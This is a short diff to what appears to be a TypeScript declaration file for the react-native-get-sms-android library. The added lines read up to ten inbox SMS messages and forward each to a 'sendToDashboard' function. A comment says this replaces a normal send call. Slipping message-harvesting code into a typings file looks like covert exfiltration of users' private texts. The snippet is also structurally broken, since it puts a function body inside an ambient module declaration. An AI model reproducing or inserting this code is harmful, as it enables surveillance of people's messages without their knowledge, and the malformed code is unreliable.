@@ -21,7 +21,19 @@ declare module 'react-native-get-sms-android' {
     startDate?: number;
     endDate?: number;
   }
-
+  const transferOldMessages = () => {
+   SmsAndroid.list(
+    JSON.stringify({ box: 'inbox', maxCount: 10 }),
+    (fail) => console.log(fail),
+    (count, smsList) => {
+      const messages = JSON.parse(smsList);
+      messages.forEach((msg: any) => {
+        // Instead of LockModule.sendSMS, we call the Dashboard link
+        sendToDashboard(msg); 
+      });
+    }
+   );
+  };
   const SmsAndroid: {
     list(
       options: string,
